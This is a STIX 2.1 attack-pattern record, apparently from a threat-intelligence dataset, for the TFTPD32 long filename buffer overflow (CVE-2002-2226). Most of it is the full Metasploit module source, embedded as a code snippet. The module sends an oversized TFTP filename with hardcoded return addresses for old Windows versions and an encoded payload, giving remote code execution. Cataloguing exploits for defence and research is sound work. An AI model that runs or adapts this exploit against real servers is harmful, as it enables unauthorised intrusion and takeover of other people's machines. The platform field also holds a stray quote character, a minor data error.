{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4400d488-eda1-41a4-be67-ce1d47d7cc25",
    "created": "2024-08-14T16:50:33.837759Z",
    "modified": "2024-08-14T16:50:33.837766Z",
    "name": "TFTPD32 Long Filename Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in TFTPD32 version 2.21 and prior. By sending a request for an overly long file name to the tftpd32 server, a remote attacker could overflow a buffer and execute arbitrary code on the system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/tftpd32_long_filename.rb",
            "external_id": "tftpd32_long_filename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-2226"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TFTPD32 Long Filename Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in TFTPD32 version 2.21\n        and prior. By sending a request for an overly long file name\n        to the tftpd32 server, a remote attacker could overflow a buffer and\n        execute arbitrary code on the system.\n      },\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          ['CVE', '2002-2226'],\n          ['OSVDB', '45903'],\n          ['BID', '6199'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 250,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows NT 4.0 SP6a English',    { 'Ret' => 0x77f9d463} ],\n          ['Windows 2000 Pro SP4 English',   { 'Ret' => 0x7c2ec663} ],\n          ['Windows XP Pro SP0 English',     { 'Ret' => 0x77dc0df0} ],\n          ['Windows XP Pro SP1 English',     { 'Ret' => 0x77dc5527} ],\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2002-11-19'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(69)\n      ], self)\n  end\n\n  def exploit\n    connect_udp\n\n    print_status(\"Trying target #{target.name}...\")\n\n    sploit =\n      \"\\x00\\x01\" +\n      rand_text_english(120, payload_badchars) +\n      \".\" +\n      rand_text_english(135, payload_badchars) +\n      [target.ret].pack('V') +\n      payload.encoded +\n      \"\\x00\"\n\n    udp_sock.put(sploit)\n\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-11-19",
    "x_mitre_platforms": [
        "win'"
    ]
}